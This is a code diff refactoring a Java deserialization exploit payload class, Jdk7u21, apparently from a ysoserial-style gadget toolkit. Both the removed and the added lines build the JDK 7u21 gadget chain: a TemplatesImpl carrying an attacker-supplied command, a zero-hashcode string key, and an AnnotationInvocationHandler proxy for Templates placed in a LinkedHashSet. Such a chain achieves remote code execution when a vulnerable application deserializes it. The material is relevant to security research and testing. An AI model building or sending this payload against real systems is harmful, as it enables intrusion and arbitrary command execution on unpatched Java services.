@@ -64,30 +64,17 @@ public class Jdk7u21 implements ObjectPayload<Object> {
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 
-		// hashCode 为 0 的字符串
-		String zeroHashCodeStr = "f5a5a608";
+		String  zeroHashCodeStr = "f5a5a608";
 
-		HashMap map = new HashMap();
+		HashMap map             = new HashMap();
 		map.put(zeroHashCodeStr, "foo");
-
-		// 使用 AnnotationInvocationHandler 为 HashMap 创建动态代理
-		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-		Constructor<?> constructor = c.getDeclaredConstructors()[0];
-		constructor.setAccessible(true);
-		InvocationHandler tempHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
-
-		// 反射写入 AnnotationInvocationHandler 的 type
+		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
 		Reflections.setFieldValue(tempHandler, "type", Templates.class);
 
-		// 为 Templates 创建动态代理
-		Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
-				new Class[]{Templates.class}, tempHandler);
-
-		// LinkedHashSet 中放入 TemplatesImpl 以及动态代理类
-		LinkedHashSet set = new LinkedHashSet(); // maintain order
+		Templates     proxy = Gadgets.createProxy(tempHandler, Templates.class);
+		LinkedHashSet set   = new LinkedHashSet();
 		set.add(templates);
 		set.add(proxy);
-
 		// 反射将 _auxClasses 和 _class 修改为 null
 		Reflections.setFieldValue(templates, "_auxClasses", null);
 		Reflections.setFieldValue(templates, "_class", null);
